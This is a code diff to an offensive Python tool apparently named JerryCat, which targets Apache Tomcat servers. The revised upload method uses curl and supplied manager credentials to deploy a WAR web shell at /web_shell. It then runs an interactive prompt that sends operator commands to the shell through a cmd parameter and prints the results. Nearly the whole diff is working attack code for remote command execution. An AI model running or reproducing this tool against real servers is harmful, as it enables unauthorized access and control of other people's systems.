@@ -1,11 +1,14 @@
 import argparse
 import base64
 import re
+import subprocess
 import sys
 import concurrent.futures
 import requests
 from requests.auth import HTTPBasicAuth
 from packaging.version import Version
+
+from bs4 import BeautifulSoup
 
 from rich.console import Console
 from rich.text import Text
@@ -185,32 +188,26 @@ class authenticated_attack(tomcat):
         self.username = username
         self.password = password
 
-    def return_headers(self) -> dict:
-        headers = {
-            'Authorization': 'Basic ' + f"{base64.b64encode(f'{self.username}:{self.password}'.encode()).decode('utf-8')}",
-            'User-Agent': 'JerryCat'
-        }
-        print(headers)
-        return headers
+    def upload(self):
 
-    def retrieve_data_current_user(self, headers: dict):
-        response = requests.get(f"{self.url}/manager/html", headers=headers)
-        print(response.text)
+        response = requests.get(url=f"{self.url}/web_shell/index.jsp")
 
-    def upload(self, payload_path) -> int:
-        headers = self.return_headers()
-        self.retrieve_data_current_user(headers)
+        if response.status_code != 200:
+            command = f'curl --upload-file webshell/web_shell.war -u "{self.username}:{self.password}" "{self.url}/manager/text/deploy?path=/web_shell"'
+            subprocess.run(command, shell=True, check=True)
 
-        if payload_path is None:
-            payload_path = './webshell/webshell.war'
+        cmd = input("jerrycat > ")
+        self.execute_webshell_cmd(cmd=cmd)
 
-        with open(payload_path, "rb") as file:
-            files = {'file': file}
-            auth = (self.username, self.password)
-            response = requests.post(f"{self.url}/manager/html/upload?org.apache.catalina.filters.CSRF_NONCE=",
-                                     files=files, auth=auth)
-            return response.status_code
+        while cmd != "exit":
+            cmd = input("jerrycat > ")
+            self.execute_webshell_cmd(cmd=cmd)
+    def execute_webshell_cmd(self, cmd: str):
+        response = requests.get(f"{self.url}/web_shell/index.jsp?cmd={cmd}")
+        soup = BeautifulSoup(response.text, 'html.parser')
+        content = soup.find_all('pre')
 
+        print(content[0].text)
 
 def main():
     global output, args
@@ -278,7 +275,7 @@ def main():
             else:
                 webshell = authenticated_attack(url=args.url, username=args.user, password=args.password)
                 webshell.login(username=args.user, password=args.password)
-                webshell.upload(payload_path=None)
+                webshell.upload()
 
         # settings for reverse mode
         case 'reverse':
